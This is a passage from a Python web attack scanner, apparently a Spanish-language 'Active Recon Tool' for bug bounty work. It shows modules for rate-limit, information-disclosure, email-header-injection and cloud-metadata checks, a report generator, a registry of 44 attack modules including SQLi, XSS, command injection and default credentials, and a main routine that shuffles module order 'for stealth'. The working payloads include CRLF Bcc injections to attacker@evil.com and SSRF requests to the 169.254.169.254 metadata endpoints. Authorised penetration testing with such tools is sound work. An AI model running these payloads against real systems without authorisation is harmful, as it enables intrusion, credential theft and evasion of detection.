    ctx["results"]["websocket"] = findings


# =====================================================================
#  MODULE 41: RATE LIMIT TESTING
# =====================================================================
def mod_rate_limit_test(ctx):
    section_header("RATE LIMIT TESTING")
    url = ctx["target_url"]
    session = ctx["session"]
    findings = []

    # Test login endpoint rate limiting
    login_paths = ["login", "api/login", "auth/login", "wp-login.php", "admin/login"]
    for path in login_paths:
        r = safe_request(session, "GET", f"{ctx['base_url']}/{path}", ctx["rate_limiter"])
        if not r or r.status_code == 404:
            continue

        log_info(f"Probando rate limit en /{path}...")
        blocked = False
        for i in range(20):
            r = safe_request(session, "POST", f"{ctx['base_url']}/{path}",
                           data={"username": "admin", "password": f"wrong{i}"},
                           rotate_ua=ctx["mode_config"]["rotate_ua"])
            if not r:
                break
            if r.status_code == 429:
                log_ok(f"Rate limiting activo en /{path} (despues de {i+1} intentos)")
                findings.append({"path": path, "limited": True, "after": i+1})
                blocked = True
                break

        if not blocked:
            log_vuln("MEDIUM", f"Sin rate limiting en /{path} (20 intentos sin bloqueo)")
            findings.append({"path": path, "limited": False, "severity": "MEDIUM"})
        break  # Only test the first login found

    # Test API rate limiting
    statuses = []
    for i in range(30):
        r = safe_request(session, "GET", url, rotate_ua=ctx["mode_config"]["rotate_ua"])
        if r:
            statuses.append(r.status_code)
            if r.status_code == 429:
                log_ok(f"Rate limiting general activo (despues de {i+1} requests)")
                findings.append({"type": "general", "limited": True, "after": i+1})
                break

    if 429 not in statuses:
        log_info("Sin rate limiting general detectado en 30 requests")

    ctx["results"]["rate_limiting"] = findings


# =====================================================================
#  MODULE 42: INFORMATION DISCLOSURE
# =====================================================================
def mod_info_disclosure(ctx):
    section_header("INFORMATION DISCLOSURE")
    url = ctx["target_url"]
    base = ctx["base_url"]
    session = ctx["session"]
    findings = []

    # Check error pages for info leaks
    error_urls = [
        f"{base}/{'a'*200}",  # Long URL
        f"{base}/..%00/",  # Null byte
        f"{base}/%00",
        f"{base}/debug",
        f"{base}/_debug",
        f"{base}/trace",
        f"{base}/error",
    ]

    for err_url in error_urls:
        r = safe_request(session, "GET", err_url, ctx["rate_limiter"],
                        ctx["mode_config"]["rotate_ua"])
        if not r:
            continue
        body = r.text.lower()

        # Check for stack traces / debug info
        indicators = [
            ("Stack trace", ["stack trace", "traceback", "at line", "exception in"]),
            ("Debug info", ["debug mode", "debug=true", "debug_toolbar"]),
            ("Server path", ["c:\\", "/var/www/", "/home/", "/usr/", "/opt/"]),
            ("Framework version", ["django version", "laravel", "rails version"]),
            ("Database info", ["mysql", "postgresql", "sqlite", "mongodb"]),
            ("Environment vars", ["database_url", "secret_key", "api_key"]),
        ]
        for category, keywords in indicators:
            for kw in keywords:
                if kw in body:
                    log_vuln("MEDIUM", f"Info Disclosure ({category}): {kw} en {err_url[:60]}")
                    findings.append({"url": err_url[:100], "category": category,
                                   "keyword": kw, "severity": "MEDIUM"})
                    break

    # Check response headers for version info
    r = safe_request(session, "GET", url, ctx["rate_limiter"])
    if r:
        for h in ["Server", "X-Powered-By", "X-AspNet-Version", "X-Runtime", "X-Generator"]:
            val = r.headers.get(h, "")
            if val and any(c.isdigit() for c in val):
                log_vuln("LOW", f"Version disclosure: {h}: {val}")
                findings.append({"header": h, "value": val, "severity": "LOW"})

    ctx["results"]["info_disclosure"] = findings


# =====================================================================
#  MODULE 43: EMAIL HEADER INJECTION
# =====================================================================
def mod_email_injection(ctx):
    section_header("EMAIL HEADER INJECTION")
    base = ctx["base_url"]
    session = ctx["session"]
    findings = []

    # Find contact/email forms
    contact_paths = ["contact", "contact-us", "feedback", "support",
                     "email", "send", "message", "mail"]
    email_params = ["email", "to", "from", "subject", "cc", "bcc", "sender", "recipient"]
    injection_payloads = [
        "test@test.com%0aBcc:attacker@evil.com",
        "test@test.com\r\nBcc: attacker@evil.com",
        "test@test.com%0d%0aBcc: attacker@evil.com",
        "test@test.com\nCc: attacker@evil.com",
    ]

    for path in contact_paths:
        r = safe_request(session, "GET", f"{base}/{path}", ctx["rate_limiter"],
                        ctx["mode_config"]["rotate_ua"])
        if not r or r.status_code == 404:
            continue

        for param in email_params:
            for payload in injection_payloads:
                r = safe_request(session, "POST", f"{base}/{path}",
                               ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"],
                               data={param: payload, "message": "test", "name": "test"})
                if r and r.status_code == 200:
                    body = r.text.lower()
                    if any(ind in body for ind in ["sent", "success", "thank"]) and \
                       not any(ind in body for ind in ["invalid", "error", "failed"]):
                        log_vuln("MEDIUM", f"Posible Email Injection: /{path} param={param}")
                        findings.append({"path": path, "param": param, "severity": "MEDIUM"})
                        break

    ctx["results"]["email_injection"] = findings


# =====================================================================
#  MODULE 44: CLOUD METADATA
# =====================================================================
def mod_cloud_metadata(ctx):
    section_header("CLOUD METADATA CHECK")
    url = ctx["target_url"]
    session = ctx["session"]
    findings = []

    # Test through SSRF-like parameters
    params = ["url", "uri", "redirect", "target", "dest", "path", "src", "proxy",
              "fetch", "load", "ref", "link", "page"]
    base = url.split("?")[0]

    metadata_endpoints = [
        ("AWS", "http://169.254.169.254/latest/meta-data/", ["ami-id","instance"]),
        ("AWS IMDSv2", "http://169.254.169.254/latest/api/token", ["token"]),
        ("GCP", "http://metadata.google.internal/computeMetadata/v1/", ["project"]),
        ("Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["compute"]),
        ("DigitalOcean", "http://169.254.169.254/metadata/v1/", ["droplet"]),
        ("Oracle", "http://169.254.169.254/opc/v1/instance/", ["instance"]),
    ]

    for param in params:
        for cloud, endpoint, indicators in metadata_endpoints:
            r = safe_request(session, "GET", f"{base}?{param}={quote(endpoint)}",
                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
            if not r:
                continue
            body = r.text.lower()
            for ind in indicators:
                if ind in body:
                    log_vuln("CRITICAL", f"Cloud Metadata ({cloud}): param={param}")
                    findings.append({"cloud": cloud, "param": param, "endpoint": endpoint,
                                   "severity": "CRITICAL"})
                    break

    ctx["results"]["cloud_metadata"] = findings


# =====================================================================
#  REPORT GENERATOR
# =====================================================================
def generate_report(ctx):
    section_header("GENERANDO REPORTE")
    domain = ctx["domain"]
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    output_dir = ctx.get("output_dir", ".")

    # Contar hallazgos por severidad
    severity_count = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    all_findings = []

    for module_name, module_results in ctx["results"].items():
        if isinstance(module_results, list):
            for item in module_results:
                if isinstance(item, dict) and "severity" in item:
                    sev = item["severity"]
                    severity_count[sev] = severity_count.get(sev, 0) + 1
                    all_findings.append({**item, "module": module_name})
        elif isinstance(module_results, dict):
            for k, v in module_results.items():
                if isinstance(v, list):
                    for item in v:
                        if isinstance(item, dict) and "severity" in item:
                            sev = item["severity"]
                            severity_count[sev] = severity_count.get(sev, 0) + 1
                            all_findings.append({**item, "module": module_name})

    # TXT Report
    txt_file = os.path.join(output_dir, f"active_recon_{domain}_{ts}.txt")
    with open(txt_file, "w") as f:
        f.write(f"{'='*70}\n")
        f.write(f"  ACTIVE RECON REPORT v2.0\n")
        f.write(f"  Target: {ctx['target_url']}\n")
        f.write(f"  Domain: {domain}\n")
        f.write(f"  Mode: {ctx['mode_config']['name']}\n")
        f.write(f"  Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"{'='*70}\n\n")

        f.write("RESUMEN DE HALLAZGOS:\n")
        f.write(f"  CRITICAL: {severity_count['CRITICAL']}\n")
        f.write(f"  HIGH:     {severity_count['HIGH']}\n")
        f.write(f"  MEDIUM:   {severity_count['MEDIUM']}\n")
        f.write(f"  LOW:      {severity_count['LOW']}\n")
        f.write(f"  INFO:     {severity_count['INFO']}\n")
        f.write(f"  Total:    {sum(severity_count.values())}\n\n")

        for finding in sorted(all_findings, key=lambda x: ["CRITICAL","HIGH","MEDIUM","LOW","INFO"].index(x.get("severity","INFO"))):
            f.write(f"[{finding['severity']}] [{finding['module']}] ")
            f.write(f"{json.dumps({k:v for k,v in finding.items() if k not in ('severity','module')})}\n")

        f.write(f"\n{'='*70}\n")
        f.write("RESULTADOS DETALLADOS:\n\n")

        for module, data in ctx["results"].items():
            f.write(f"\n--- {module.upper()} ---\n")
            f.write(json.dumps(data, indent=2, default=str) + "\n")

    # JSON Report
    json_file = os.path.join(output_dir, f"active_recon_{domain}_{ts}.json")
    report = {
        "metadata": {
            "tool": "Active Recon Tool v2.0",
            "target": ctx["target_url"],
            "domain": domain,
            "mode": ctx["mode_config"]["name"],
            "timestamp": datetime.now().isoformat(),
            "modules_executed": list(ctx["results"].keys()),
        },
        "summary": severity_count,
        "findings": all_findings,
        "results": ctx["results"],
    }
    with open(json_file, "w") as f:
        json.dump(report, f, indent=2, default=str)

    log_ok(f"Reporte TXT: {txt_file}")
    log_ok(f"Reporte JSON: {json_file}")
    print()

    # Print summary
    total = sum(severity_count.values())
    print(_c(C.BOLD, "  RESUMEN:"))
    if severity_count["CRITICAL"]:
        crit = severity_count["CRITICAL"]
        print(f"    {_c(C.R+C.BOLD, f'CRITICAL: {crit}')} ")
    if severity_count["HIGH"]:
        high = severity_count["HIGH"]
        print(f"    {_c(C.R, f'HIGH: {high}')} ")
    if severity_count["MEDIUM"]:
        med = severity_count["MEDIUM"]
        print(f"    {_c(C.Y, f'MEDIUM: {med}')} ")
    if severity_count["LOW"]:
        low = severity_count["LOW"]
        print(f"    {_c(C.B, f'LOW: {low}')} ")
    print(f"    Total hallazgos: {total}")
    print()


# =====================================================================
#  ALL MODULES REGISTRY
# =====================================================================
ALL_MODULES = {
    "portscan":     ("Port Scanner",            mod_port_scan),
    "services":     ("Service Detection",       mod_service_detect),
    "zonetrans":    ("DNS Zone Transfer",       mod_zone_transfer),
    "dnsrecon":     ("DNS Recon",               mod_dns_recon),
    "dirbust":      ("Directory Bruteforce",    mod_dirbust),
    "subbrust":     ("Subdomain Bruteforce",    mod_subdomain_brute),
    "vhost":        ("VHost Discovery",         mod_vhost),
    "crawl":        ("Web Crawler",             mod_crawler),
    "paramdisco":   ("Parameter Discovery",     mod_param_discovery),
    "apidisco":     ("API Discovery",           mod_api_discovery),
    "sensitive":    ("Sensitive Files",          mod_sensitive_files),
    "backup":       ("Backup Discovery",        mod_backup_discovery),
    "techfp":       ("Tech Fingerprint",        mod_tech_fingerprint),
    "waf":          ("WAF Detection",           mod_waf_detect),
    "cmsenum":      ("CMS Enumeration",         mod_cms_enum),
    "sslaudit":     ("SSL/TLS Audit",           mod_ssl_audit),
    "httpmethods":  ("HTTP Methods",            mod_http_methods),
    "secheaders":   ("Security Headers",        mod_security_headers),
    "cookies":      ("Cookie Security",         mod_cookie_security),
    "cors":         ("CORS Testing",            mod_cors_test),
    "csp":          ("CSP Analysis",            mod_csp_analysis),
    "clickjack":    ("Clickjacking Test",       mod_clickjacking),
    "csrf":         ("CSRF Detection",          mod_csrf_detection),
    "sqli":         ("SQL Injection",           mod_sqli),
    "xss":          ("XSS Probe",               mod_xss),
    "lfi":          ("LFI Probe",               mod_lfi),
    "rfi":          ("RFI Probe",               mod_rfi),
    "redirect":     ("Open Redirect",           mod_open_redirect),
    "crlf":         ("CRLF Injection",          mod_crlf),
    "hosthdr":      ("Host Header Injection",   mod_host_header),
    "ssrf":         ("SSRF Detection",          mod_ssrf),
    "ssti":         ("SSTI Detection",          mod_ssti),
    "cmdi":         ("Command Injection",       mod_cmdi),
    "xxe":          ("XXE Detection",           mod_xxe),
    "hpp":          ("HTTP Param Pollution",    mod_hpp),
    "takeover":     ("Subdomain Takeover",      mod_subdomain_takeover),
    "defcreds":     ("Default Credentials",     mod_default_creds),
    "jwt":          ("JWT Analysis",            mod_jwt_analysis),
    "graphql":      ("GraphQL Testing",         mod_graphql),
    "websocket":    ("WebSocket Testing",       mod_websocket),
    "ratelimit":    ("Rate Limit Testing",      mod_rate_limit_test),
    "infodiscl":    ("Info Disclosure",         mod_info_disclosure),
    "emailinj":     ("Email Header Injection",  mod_email_injection),
    "cloudmeta":    ("Cloud Metadata",          mod_cloud_metadata),
}


# =====================================================================
#  MAIN
# =====================================================================
def main():
    parser = argparse.ArgumentParser(
        description="Active Recon Tool v2.0 - Advanced Bug Bounty Edition",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Uso simple:
  python3 active-recon.py https://target.com

Con modo:
  python3 active-recon.py https://target.com --mode slow
  python3 active-recon.py https://target.com --mode medium
  python3 active-recon.py https://target.com --mode high

Modulos especificos:
  python3 active-recon.py https://target.com -m sqli,xss,lfi
""")
    parser.add_argument("target", nargs="?", help="URL del target")
    parser.add_argument("-t", "--target-flag", dest="target_alt", help="URL del target (alternativa)")
    parser.add_argument("--mode", choices=["slow","medium","high"], help="Modo de velocidad")
    parser.add_argument("-m", "--modules", help="Modulos a ejecutar (separados por coma)")
    parser.add_argument("-o", "--output", default=".", help="Directorio de reportes")
    parser.add_argument("--threads", type=int, help="Override hilos (default segun modo)")
    parser.add_argument("--timeout", type=int, default=10, help="Timeout HTTP (default: 10)")
    parser.add_argument("--ports", default="top100", help="top100 | rango (1-1000) | lista (80,443)")
    parser.add_argument("--wordlist", help="Wordlist custom para directorios")
    parser.add_argument("--sublist", help="Wordlist custom para subdominios")
    parser.add_argument("--extensions", default="php,html,txt,bak,old,asp,aspx,jsp,json,xml,yml,yaml,conf,cfg,ini,log,sql,zip,tar.gz,rar")
    parser.add_argument("--crawl-depth", type=int, default=3)
    parser.add_argument("--crawl-pages", type=int, default=100)
    parser.add_argument("--user-agent", help="User-Agent custom")
    parser.add_argument("--proxy", help="Proxy HTTP (ej: http://127.0.0.1:8080)")
    parser.add_argument("--cookies", help="Cookies (ej: session=abc; token=xyz)")
    parser.add_argument("--headers", help="Headers custom (separados por ;;)")
    parser.add_argument("--no-color", action="store_true")
    parser.add_argument("--skip-disclaimer", action="store_true", help="Saltar disclaimer (solo automation)")

    args = parser.parse_args()

    # Handle target
    target = args.target or args.target_alt
    if not target:
        parser.print_help()
        sys.exit(1)

    # Normalize URL
    if not target.startswith(("http://", "https://")):
        target = f"https://{target}"

    global NO_COLOR
    NO_COLOR = args.no_color

    banner()

    # Disclaimer
    if not args.skip_disclaimer:
        show_disclaimer()

    # Mode selection
    if args.mode:
        mode = args.mode
    else:
        mode = select_mode_interactive()

    mode_config = SPEED_MODES[mode]
    mname = mode_config["name"]
    print(f"\n  {_c(C.G+C.BOLD, f'Modo seleccionado: {mname}')}")
    print(f"  {_c(C.D, mode_config['desc'])}\n")

    # Parse ports
    ports = TOP_PORTS
    if args.ports != "top100":
        if "-" in args.ports:
            start, end = args.ports.split("-")
            ports = list(range(int(start), int(end)+1))
        else:
            ports = [int(p) for p in args.ports.split(",")]

    # Threads (mode default or override)
    threads = args.threads or mode_config["threads"]

    # Rate limiter
    rate_limiter = RateLimiter(mode_config)

    # Session
    session = create_session(
        user_agent=args.user_agent,
        proxy=args.proxy,
        cookies=args.cookies,
        headers=args.headers,
        timeout=args.timeout,
        rotate_ua=mode_config["rotate_ua"],
    )

    # Custom wordlists
    custom_wordlist = None
    if args.wordlist and os.path.isfile(args.wordlist):
        with open(args.wordlist) as f:
            custom_wordlist = [l.strip() for l in f if l.strip()]
    custom_sublist = None
    if args.sublist and os.path.isfile(args.sublist):
        with open(args.sublist) as f:
            custom_sublist = [l.strip() for l in f if l.strip()]

    # Parse target
    parsed = urlparse(target)
    domain = parsed.hostname
    target_host = resolve_host(domain)

    if not target_host:
        print(f"\n  {_c(C.R, f'[!] No se pudo resolver: {domain}')}")
        sys.exit(1)

    log_info(f"Target: {target}")
    log_info(f"Domain: {domain}")
    log_info(f"IP: {target_host}")
    log_info(f"Mode: {mode_config['name']}")
    log_info(f"Threads: {threads}")
    if args.proxy:
        log_info(f"Proxy: {args.proxy}")
    print()

    # Context object - shared state across all modules
    ctx = {
        "target_url": target,
        "target_host": target_host,
        "domain": domain,
        "base_url": get_base_url(target),
        "session": session,
        "rate_limiter": rate_limiter,
        "mode_config": mode_config,
        "threads": threads,
        "timeout": args.timeout,
        "ports": ports,
        "output_dir": args.output,
        "custom_wordlist": custom_wordlist,
        "custom_sublist": custom_sublist,
        "extensions": args.extensions,
        "crawl_depth": args.crawl_depth,
        "crawl_pages": args.crawl_pages,
        "results": {},
        "_crawled_links": set(),
        "_crawled_forms": [],
        "_crawled_params": set(),
    }

    # Determine which modules to run
    if args.modules:
        module_keys = [m.strip() for m in args.modules.split(",")]
    else:
        module_keys = list(ALL_MODULES.keys())

    # Randomize order for stealth
    if mode_config["randomize"] and not args.modules:
        # Keep some logical ordering but shuffle within groups
        groups = [
            ["portscan","services"],
            ["zonetrans","dnsrecon"],
            ["dirbust","subbrust","vhost"],
            ["crawl","paramdisco","apidisco"],
            ["sensitive","backup"],
            ["techfp","waf","cmsenum"],
            ["sslaudit","httpmethods","secheaders","cookies"],
            ["cors","csp","clickjack","csrf"],
            ["sqli","xss","lfi","rfi","redirect","crlf","hosthdr"],
            ["ssrf","ssti","cmdi","xxe","hpp"],
            ["takeover","defcreds","jwt","graphql","websocket"],
            ["ratelimit","infodiscl","emailinj","cloudmeta"],
        ]
        module_keys = []
        for group in groups:
            g = [m for m in group if m in ALL_MODULES]
            random.shuffle(g)
            module_keys.extend(g)

    # Print modules to execute
    valid_modules = [m for m in module_keys if m in ALL_MODULES]
    log_info(f"Ejecutando {len(valid_modules)} modulos...")
    print()

    start_time = time.time()

    # Execute modules
    for mod_key in valid_modules:
        name, func = ALL_MODULES[mod_key]
        try:
            func(ctx)
        except KeyboardInterrupt:
            log_warn("Interrumpido por usuario. Generando reporte parcial...")
            break
        except Exception as e:
            log_fail(f"Error en modulo {name}: {e}")

    elapsed = time.time() - start_time
    log_info(f"\nEscaneo completado en {elapsed:.1f} segundos")
    log_info(f"Total requests: {rate_limiter.request_count}")

    # Generate report
    generate_report(ctx)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n  {_c(C.Y, '[!] Interrumpido.')}")
        sys.exit(0)
